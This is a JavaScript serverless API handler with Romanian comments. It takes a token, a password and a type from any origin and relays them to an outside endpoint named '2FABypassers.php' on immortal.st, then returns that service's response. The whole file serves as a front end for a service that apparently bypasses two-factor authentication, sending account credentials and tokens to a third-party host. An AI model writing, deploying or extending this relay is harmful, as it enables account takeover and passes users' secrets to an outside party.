export default async function handler(req, res) {
    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    // Preflight OPTIONS
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    // Doar POST acceptat
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const { token, password, type } = req.body;

        // Validare
        if (!token || !password) {
            return res.status(400).json({ error: 'Missing token or password' });
        }

        // Request către API-ul real
        const response = await fetch('https://immortal.st/pages//misc/2FABypassers.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            },
            body: JSON.stringify({
                token: token,
                password: password,
                type: type || 'Age'
            })
        });

        // Preluăm răspunsul
        const data = await response.text();

        // Îl trimitem înapoi la frontend
        res.status(response.status).setHeader('Content-Type', 'application/json').send(data);

    } catch (error) {
        res.status(500).json({ error: error.message });
    }
}
